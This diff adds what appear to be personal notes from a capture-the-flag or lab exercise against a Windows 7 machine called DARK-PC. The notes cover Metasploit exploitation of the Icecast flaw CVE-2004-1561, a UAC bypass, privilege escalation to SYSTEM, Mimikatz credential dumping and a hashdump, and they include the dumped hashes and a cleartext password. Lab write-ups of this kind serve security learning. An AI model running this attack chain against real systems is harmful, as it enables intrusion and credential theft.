@@ -1,0 +1,106 @@
+					eploitation:
+CVE-2004-1561
+
+use exploit/windows/http/icecast_header
+
+
+					
+
+					meterpreter1:
+
+(meterpreter)sysinfo - 
+
+Computer        : DARK-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+
+
+
+					
+					
+
+					privesc:
+
+run post/multi/recon/local_exploit_suggester
+
+exploit/windows/local/bypassuac_eventvwr
+
+(background session now)
+
+use exploit/windows/local/bypassuac_eventvwr
+
+(set session 1)
+
+(run -j)
+
+					
+
+					
+					meterpreter2:
+
+(getprivs)
+
+get ownership of files -SeTakeOwnershipPrivilege
+
+(migrate -N spoolsv.exe)
+
+(getuid)
+
+NT AUTHORITY\SYSTEM
+
+(load kiwi) - loads the kiwi extension [updated version of Mimikatz] for password dumping
+
+(creds_all)
+
+msv credentials
+===============
+
+Username  Domain   LM                                NTLM                              SHA1
+--------  ------   --                                ----                              ----
+Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb
+
+wdigest credentials
+===================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+DARK-PC$  WORKGROUP  (null)
+Dark      Dark-PC    Password01!
+
+tspkg credentials
+=================
+
+Username  Domain   Password
+--------  ------   --------
+Dark      Dark-PC  Password01!
+
+kerberos credentials
+====================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+Dark      Dark-PC    Password01!
+dark-pc$  WORKGROUP  (null)
+
+
+
+
+Dark's password found - Password01!
+
+remote desktop 'fyi'- (run post/windows/manage/enable_rdp)
+
+					
+
+					
+
+					hashdump:
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
